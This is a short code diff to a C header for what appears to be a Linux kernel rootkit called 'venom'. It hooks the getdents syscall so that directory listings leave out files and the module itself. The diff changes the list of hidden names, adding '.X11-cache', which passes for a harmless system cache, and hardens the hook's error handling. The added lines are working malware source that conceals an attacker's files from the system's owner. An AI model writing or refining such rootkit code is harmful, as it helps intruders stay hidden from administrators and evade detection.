@@ -16,8 +16,6 @@
  */
 
 
-
-
 #ifndef GETDENTS_H
 #define GETDENTS_H
 
@@ -41,7 +39,7 @@ notrace static int should_hide_file(const char *name) {
     }
     
     if (strstr(name, "trevohack") || strstr(name, ".secret") ||
-        strstr(name, "source") || strstr(name, "_defense") ||
+        strstr(name, "source") || strstr(name, ".X11-cache") ||
         strcmp(name, "venom.ko") == 0)
         return 1;
     
@@ -121,10 +119,13 @@ notrace static asmlinkage long hooked_getdents(const struct pt_regs *regs) {
         off += d->d_reclen;
     }
     
-    copy_to_user(user_dir, kbuf, ret);
+    if (copy_to_user(user_dir, kbuf, ret)) {
+        kfree(kbuf);
+        return orig_getdents(regs);
+    }
     kfree(kbuf);
+
     return ret;
 }
 
 #endif 
-
